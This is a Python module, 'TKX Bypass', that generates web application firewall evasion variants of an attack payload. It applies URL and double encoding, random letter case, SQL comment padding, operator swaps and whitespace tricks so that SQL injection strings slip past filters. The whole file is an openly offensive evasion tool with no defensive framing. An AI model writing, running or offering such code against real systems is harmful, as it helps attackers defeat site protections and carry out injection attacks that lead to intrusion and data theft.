#!/usr/bin/env python3
from typing import List
"""
TKX Bypass - Simple WAF Bypass Techniques
"""
import random
import urllib.parse

class TKXBypass:
    """WAF bypass payload generator"""
    
    @staticmethod
    def encode_payload(payload: str, technique: str = "default") -> str:
        """Encode payload to bypass WAF"""
        
        if technique == "urlencode":
            return urllib.parse.quote(payload)
        
        elif technique == "double_encode":
            single = urllib.parse.quote(payload)
            return urllib.parse.quote(single)
        
        elif technique == "unicode":
            # Simple unicode replacement
            replacements = {
                "'": "%27",
                '"': "%22",
                " ": "%20",
                "=": "%3D",
                "(": "%28",
                ")": "%29"
            }
            result = payload
            for old, new in replacements.items():
                result = result.replace(old, new)
            return result
        
        elif technique == "case_rotate":
            # Random case
            return ''.join(
                char.upper() if random.random() > 0.5 else char.lower()
                for char in payload
            )
        
        elif technique == "comment_obfuscate":
            # Add SQL comments
            return payload.replace(" ", "/**/")
        
        else:
            # Default: mix of techniques
            encoded = payload
            if random.random() > 0.5:
                encoded = encoded.replace(" ", "/**/")
            if random.random() > 0.5:
                encoded = encoded.replace("'", "%27")
            return encoded
    
    @staticmethod
    def get_bypass_payloads(base_payload: str) -> List[str]:
        """Generate multiple bypass variations"""
        variations = []
        
        techniques = [
            "urlencode",
            "double_encode", 
            "unicode",
            "case_rotate",
            "comment_obfuscate"
        ]
        
        for tech in techniques:
            variations.append(TKXBypass.encode_payload(base_payload, tech))
        
        # Add some special variations
        variations.extend([
            base_payload.replace("OR", "||"),
            base_payload.replace("AND", "&&"),
            base_payload.replace(" ", "%0A"),  # Newline
            base_payload.replace(" ", "%09"),  # Tab
            f"({base_payload})",
            f"(({base_payload}))",
        ])
        
        return variations
